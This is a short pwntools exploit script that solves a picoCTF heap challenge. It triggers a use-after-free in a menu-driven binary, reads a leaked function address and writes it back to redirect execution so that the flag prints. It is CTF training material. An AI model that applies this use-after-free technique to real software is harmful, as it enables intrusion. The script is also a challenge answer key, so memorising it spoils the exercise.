from pwn import *

r = process('./vuln')
# r = remote('mercury.picoctf.net', 61817)

r.recvuntil(b'(e)xit\n')
r.sendline(b'i')
r.recvuntil(b"You're leaving already(Y/N)?\n")
r.sendline(b'Y')

r.recvuntil(b'(e)xit\n')
r.sendline(b's')
r.recvuntil(b'OOP! Memory leak...0x')
hahaexploitgobrrr_addr = int(str(r.recv(7))[2:-1], 16)
success(hahaexploitgobrrr_addr)

r.recvuntil(b'(e)xit\n')
r.sendline(b'l')
r.recvuntil(b'try anyways:\n')
raw_input()
r.sendline(p64(hahaexploitgobrrr_addr))

success(f'Flag: {r.recvline().strip().decode()}')

r.close()